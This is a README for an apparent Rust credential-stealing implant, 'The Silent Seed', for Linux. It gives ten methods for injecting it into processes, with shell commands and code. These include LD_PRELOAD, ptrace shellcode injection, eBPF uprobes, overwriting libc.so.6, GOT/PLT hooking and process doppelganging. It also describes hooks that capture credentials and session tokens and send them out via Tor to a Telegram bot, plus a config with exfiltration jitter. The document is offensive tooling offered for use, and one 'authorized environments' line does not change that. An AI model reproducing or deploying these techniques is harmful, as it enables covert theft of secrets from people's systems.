# Component A: The Silent Seed (Linux)

Rust-based in-memory implant for passive data capture and exfiltration on Linux systems.

## Quick Start

### Using Automation Scripts

```bash
# Build all components (includes Silent Seed)
./scripts/build-all.sh

# Run tests
./scripts/test-all.sh
```

### Manual Building

```bash
# Linux
cd protosyte-seed
cargo build --release

# Minimal, static, stripped binary (recommended)
RUSTFLAGS='-C panic=abort -C strip=symbols -C opt-level=z' \
cargo build --release \
  --target x86_64-unknown-linux-musl
```

## Overview

The Silent Seed is a shared library that hooks system calls to passively capture data from running processes. It operates entirely in memory and exfiltrates encrypted data via Tor to the Broadcast Engine.

## Implantation Methods

### Method 1: LD_PRELOAD Injection (Standard)

**Description**: Most common and compatible method. Works with any dynamically linked binary.

**Usage**:
```bash
# Inject into new process
LD_PRELOAD=/path/to/libprotosyte.so /path/to/target_application

# For all processes in a shell session
export LD_PRELOAD=/path/to/libprotosyte.so
```

**Implementation**:
```rust
use protosyte_seed::injection::InjectionManager;

InjectionManager::ld_preload_inject(
    "/path/to/libprotosyte.so",
    &["/usr/bin/target_app", "--arg1", "value"]
)?;
```

**Pros**:
- Simple and widely compatible
- No special privileges needed
- Works with any dynamically linked binary

**Cons**:
- Visible in process environment
- May not work with statically linked binaries

---

### Method 2: Ptrace-based Process Injection (Memory-only)

**Description**: Inject shellcode directly into running process memory without writing files to disk.

**Usage**:
```bash
# Requires appropriate permissions (same user or root)
./injector --pid 12345 --shellcode payload.bin
```

**Implementation**:
```rust
let shellcode = include_bytes!("payload.bin");
InjectionManager::ptrace_inject(12345, shellcode)?;
```

**How it works**:
1. Attach to target process using `ptrace(PTRACE_ATTACH)`
2. Save process state (registers, memory)
3. Allocate memory in target process using syscall injection
4. Write shellcode to allocated memory
5. Modify instruction pointer to point to shellcode
6. Resume execution

**Pros**:
- No file on disk
- Works with running processes
- Very stealthy

**Cons**:
- Requires ptrace capabilities or root
- Can be detected by anti-debugging measures

---

### Method 3: eBPF Uprobes (Kernel-level Hooking)

**Description**: Use eBPF (extended Berkeley Packet Filter) to hook functions at the kernel level. Extremely stealthy and powerful.

**Requirements**:
- Linux kernel 4.17+
- Root access (for loading eBPF programs)
- clang with bpf target support

**Usage**:
```bash
# Compile eBPF program
clang -target bpf -O2 -c hook.c -o hook.o

# Load eBPF program (requires root)
./ebpf_loader --target /usr/bin/target_app --function write
```

**Implementation**:
```rust
InjectionManager::ebpf_uprobe_inject(
    "/usr/bin/target_app",
    "write"
)?;
```

**eBPF Program Structure**:
```c
#include <uapi/linux/ptrace.h>
#include <linux/bpf.h>

SEC("uprobe/target_function")
int hook_function(struct pt_regs *ctx) {
    // Called before target function executes
    // Access function arguments via ctx
    return 0;
}

SEC("uretprobe/target_function")
int unhook_function(struct pt_regs *ctx) {
    // Called after target function returns
    // Access return value via ctx
    return 0;
}
```

**Pros**:
- Kernel-level hooking - extremely difficult to detect
- No process modification
- Works system-wide

**Cons**:
- Requires root access
- Requires modern kernel
- More complex to implement

---

### Method 4: Library Constructor Injection

**Description**: Use GCC constructor attribute to automatically execute code when library loads.

**Implementation**: Built into the library itself - no external injection needed.

```rust
#[no_mangle]
#[used]
static INIT: extern "C" fn() = init_hooks;

#[no_mangle]
extern "C" fn init_hooks() {
    // This runs automatically when library is loaded
    HookManager::init().unwrap();
}
```

**Usage**: Simply load the library using any method (LD_PRELOAD, dlopen, etc.)

---

### Method 5: /proc/pid/mem Direct Memory Injection

**Description**: Directly write to process memory via `/proc/pid/mem` filesystem.

**Requirements**:
- Same user or root
- Process must be stopped (via ptrace or signal)

**Usage**:
```bash
# Stop target process
kill -STOP <pid>

# Inject via /proc/mem
./mem_injector --pid <pid> --shellcode payload.bin

# Resume process
kill -CONT <pid>
```

**Implementation**:
```rust
InjectionManager::proc_mem_inject(pid, shellcode)?;
```

**Pros**:
- Direct memory access
- No library loading required
- Very low-level

**Cons**:
- Process must be stopped
- Requires permissions
- Can be detected

---

### Method 6: Shared Object Hijacking

**Description**: Replace system library with our own that re-exports original symbols but hooks functions.

**Usage**:
```bash
# Find library path
ldd /usr/bin/target_app | grep libc.so

# Backup and replace
cp /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libc.so.6.backup
cp libprotosyte.so /lib/x86_64-linux-gnu/libc.so.6
```

**Implementation**:
```rust
InjectionManager::library_hijack(
    "libc.so.6",
    "/path/to/libprotosyte.so"
)?;
```

**Library Wrapper Structure**:
```rust
// Re-export all original symbols
#[link(name = "c", kind = "dylib")]
extern "C" {
    // Original libc symbols
}

// Hook specific functions
#[no_mangle]
pub extern "C" fn write(fd: i32, buf: *const u8, count: usize) -> isize {
    // Our hook code
    let result = unsafe { original_write(fd, buf, count) };
    // Capture data
    capture_data(buf, count);
    result
}
```

**Pros**:
- System-wide injection
- Affects all processes using the library
- Persistent

**Cons**:
- Requires root to replace system libraries
- May break system if not done carefully
- Easy to detect file changes

---

### Method 7: FUSE-based Filesystem Hooking

**Description**: Use FUSE (Filesystem in Userspace) to intercept library loads and inject our code.

**Usage**:
```bash
# Mount FUSE filesystem
./fuse_hook --mount /mnt/protosyte --target-lib libssl.so

# Run target with FUSE mount
LD_LIBRARY_PATH=/mnt/protosyte:/usr/lib /usr/bin/target_app
```

**Implementation**:
```rust
InjectionManager::fuse_hook_inject(
    "/mnt/protosyte",
    "libssl.so"
)?;
```

**Pros**:
- Transparent to application
- No process modification
- Can intercept multiple libraries

**Cons**:
- Requires FUSE setup
- Performance overhead
- More complex

---

### Method 8: GOT/PLT Hooking (Global Offset Table)

**Description**: Modify the Global Offset Table to redirect function calls to our hooks.

**Usage**:
```bash
# Requires write access to binary
./got_hook --binary /usr/bin/target_app --symbol write --hook libprotosyte.so
```

**Implementation**:
```rust
extern "C" fn hooked_write(fd: i32, buf: *const u8, count: usize) -> isize {
    capture_data(buf, count);
    unsafe { original_write(fd, buf, count) }
}

InjectionManager::got_plt_hook(
    "/usr/bin/target_app",
    "write",
    hooked_write as *const std::ffi::c_void
)?;
```

**How it works**:
1. Parse ELF binary to find GOT/PLT sections
2. Locate target symbol in GOT
3. Overwrite GOT entry with our hook function address
4. Function calls now go through our hook

**Pros**:
- Works with any function in GOT
- Can hook before process starts
- Persistent modification

**Cons**:
- Requires write access to binary
- May break code signing
- Detectable by integrity checks

---

### Method 9: LD_AUDIT Injection (Dynamic Linker Audit)

**Description**: Use LD_AUDIT interface to hook library loads and symbol resolution.

**Usage**:
```bash
LD_AUDIT=/path/to/libprotosyte_audit.so /usr/bin/target_app
```

**Implementation**: The library implements LD_AUDIT callbacks:

```rust
#[no_mangle]
pub extern "C" fn la_objopen(
    link_map: *mut c_void,
    cookie: *mut c_void,
    flags: u32
) -> u32 {
    // Called when object is loaded
    HookManager::init().ok();
    0
}

#[no_mangle]
pub extern "C" fn la_symbind64(
    sym: *const c_void,
    ndx: u64,
    refcook: *mut c_void,
    defcook: *mut c_void,
    flags: *mut u32,
    symname: *const c_char,
) -> *mut c_void {
    // Called when symbol is bound - can intercept function calls
    sym
}
```

**Pros**:
- Standard interface
- Can intercept all library loads
- No process modification needed

**Cons**:
- Visible in environment
- Limited hooking capabilities

---

### Method 10: Process Doppelganging

**Description**: Create a suspended process from a legitimate binary, modify its memory, then execute.

**Usage**:
```bash
./process_doppelganger --target /usr/bin/legitimate_app --payload payload.bin
```

**Implementation**:
```rust
InjectionManager::process_doppelganging(
    "/usr/bin/legitimate_app",
    payload
)?;
```

**How it works**:
1. Create temporary copy of legitimate binary
2. Inject payload into temporary binary
3. Execute temporary binary (which appears legitimate)
4. Clean up temporary file

**Pros**:
- Appears to be legitimate process
- Can bypass some detection mechanisms

**Cons**:
- Requires file system access
- Temporary file may be detected

---

## Configuration

Bot token and endpoints via environment variables:
- `PROTOSYTE_BOT_TOKEN`: Telegram bot token
- `PROTOSYTE_PASSPHRASE`: Encryption passphrase
- `PROTOSYTE_MISSION_CONFIG`: Path to mission.yaml (optional)

Or via `mission.yaml`:
```yaml
mission:
  id: 0xDEADBEEFCAFEBABE
  name: "Operation Example"

exfiltration:
  telegram_token: "[from env]"
  interval_seconds: 347
  jitter_percent: 25
```

## Advanced Features

- **System Call Hooking**: Intercepts `write`, `send`, `SSL_write`, and more
- **Pattern-Based Filtering**: Captures credentials, keys, session tokens
- **AES-GCM Encryption**: All data encrypted before exfiltration
- **LZ4 Compression**: Efficient data compression
- **Tor Exfiltration**: Anonymous data transmission
- **Memory-Only Operation**: No disk artifacts
- **Quantum Obfuscation**: Compile-time string obfuscation

## Requirements

- Linux kernel 3.10+ (for most methods)
- Dynamically linked target binaries (for LD_PRELOAD methods)
- Root access (for some advanced methods)
- Tor running (port 9050 or 9150)

## Security Considerations

- Some methods require elevated privileges
- May be detected by security tools
- Use only in authorized environments
- Follow operational security procedures

## Troubleshooting

**Library not loading**:
- Check file permissions
- Verify architecture match (x86_64 vs i686)
- Check for missing dependencies (`ldd libprotosyte.so`)

**No data being captured**:
- Verify target process is using hooked functions
- Check pattern filters in mission.yaml
- Verify encryption keys are set

**Exfiltration failing**:
- Verify Tor is running (`netstat -tuln | grep 9050`)
- Check network connectivity
- Verify bot token is correct

## See Also

- `protosyte-seed-windows/README.md` - Windows implantation methods
- `protosyte-seed-macos/README.md` - macOS implantation methods
- `../MISSION_YAML_INTEGRATION.md` - Mission configuration guide
